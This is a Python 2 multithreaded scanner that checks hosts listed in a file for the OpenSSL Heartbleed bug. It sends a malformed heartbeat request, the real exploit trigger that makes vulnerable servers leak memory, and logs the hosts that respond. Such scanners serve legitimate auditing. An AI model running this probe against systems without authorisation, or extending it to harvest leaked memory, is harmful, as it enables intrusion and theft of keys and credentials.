#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""A quick scanner for SSL heartbleed vulnerability (CVE-2014-0160)"""

import os
import struct
import socket
import time
import select
import signal
import threading
from multiprocessing.dummy import Pool

lock = threading.Lock()
scan_results = []
threadpool = Pool(processes=50)


def signal_handler(signal, frame):
    print "Ctrl+C pressed.. aborting..."
    threadpool.terminate()
    threadpool.done = True


def h2bin(x):
    '''
     "16 03 03 00  dc 01 00 00 d8 03 03 53" --> '\x16\x03\x03\x00\xdc\x01\x00\x00\xd8\x03\x03S'
    '''
    return x.replace(' ', '').replace('\n', '').decode('hex')

#tls clienthello package
hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)

    #  confirm Server Hello
    if hdr is None:
        return None, None, None

    # C      ---- [big-edition] + [unsigned char] + [unsigned short] + [unsigned short]
    # Python ---- [big-edition] + integer + integer + integer
    # [Content Type] + [Version] + [Length]
    typ, ver, ln = struct.unpack('>BHH', hdr)

    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def hit_hb(s):
    while True:

        # TLSv1.1 Record Layer: Encrypted Heartbeat
        # Content Type: Heartbeat (24)
        # Version: TLS 1.1 (0x0302)
        # Length: 19
        # Encrypted Heartbeat Message
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            return True

        if typ == 21:
            return False

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print


def unpack_handshake(pay):
    """
    Unpack the SSL handshake in Multiple Handshake Message
    """
    paylen = len(pay)
    offset = 0
    payarr = []

    while offset < paylen:
        h = pay[offset:offset + 4]
        t, l24 = struct.unpack('>B3s', h)
        l = struct.unpack('>I', '\x00' + l24)[0]
        payarr.append((
            t,
            l,
            pay[offset+4:offset+4+l]
            ))
        offset = offset+l+4
    return payarr

def is_vulnerable(host, timeout, port=443):
    """ Check if remote host is vulnerable to heartbleed

     Returns:
        None  -- If remote host has no ssl
        False -- Remote host has ssl but likely not vulnerable
        True  -- Remote host might be vulnerable
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(int(timeout))

    #print "[x]host, port", host, port, "---------"
    try:
        s.connect((host, int(port)))
    except Exception, e:
        return None

    # 发送 clienthello
    s.send(hello)

    # 等待返回
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return None

        if typ == 22:
            payarr = unpack_handshake(pay)
            # Look for server hello done message.
            finddone = [t for t, l, p in payarr if t == 14]
            if len(finddone) > 0:
                break


    # OpenSSL responds with records of length 0x4000. It starts with 3 bytes
    # (length, response type) and ends with a 16 byte padding. If the payload is
    # too small, OpenSSL buffers it and this will cause issues with repeated
    # heartbeat requests. Therefore request a payload that fits exactly in four
    # records (0x4000 * 4 - 3 - 16 = 0xffed).
    #'''
    ver_chr = chr(ver&0xff)
    #hb  = h2bin("18 03") + ver_chr + h2bin("40 00 01 3f fd") + "\x01"*16381
    #hb += h2bin("18 03") + ver_chr + h2bin("00 03 01 00 00")
    hb = h2bin("18 03") + ver_chr + h2bin("00 03 01 40 00")
    #'''

    """
    hb = h2bin('''
            18 03 03 00 03
            01 40 00
        ''')
    #"""


    s.send(hb)

    return hit_hb(s)


def scan_host(*kw):
    """ Scans a single host, logs into

    Returns:
        list(timestamp, ipaddress, vulnerabilitystatus)
    """
    port = 443
    timeout = 5
    if len(*kw) == 1:
        host = kw[0][0]
    elif len(*kw) == 2:
        host, port = kw[0][0], int(kw[0][1])
    elif len(*kw) == 3:
        host, port, timeout = kw[0][0], int(kw[0][1]), kw[0][1]
    else:
        print "get para error"

    #print host, port, timeout

    result = is_vulnerable(host, timeout, port)

    handle_result(host, port, result)

    return result

def handle_result(host, port, result):
    tm = time.time()
    with lock:
        scan_results.append([host, port, result])


def hb_file_check(check_file, result_file = None):
    port = 443

    scan_list = []

    with open(check_file) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if ":" in line:
                host, port = line.split(":")
            elif "\t" in line:
                host, port = line.split("\t")
            elif " " in line:
                host, port = line.split(" ")
            else:
                host = line

            scan_list.append([host, port])

    task = threadpool.map(scan_host, scan_list)

    threadpool.close()
    threadpool.join()

    vul_results = []
    for x in scan_results:
        print x
        if x[2]:
            vul_results.append(x)

    if result_file:
        with open(result_file, 'w') as f:
            f.write("[HeartBleed Scan]Scan %d hosts, Find %d heartbleed vul\n\n" % (len(scan_results), len(vul_results)))
            for x in vul_results:
                h, p, r = x
                f.write("%s %s\n" %(h, p))

if __name__ == '__main__':

    signal.signal(signal.SIGINT, signal_handler)


    input_file = "host.txt"
    result_file = "hb.txt"
    hb_file_check(input_file, result_file)

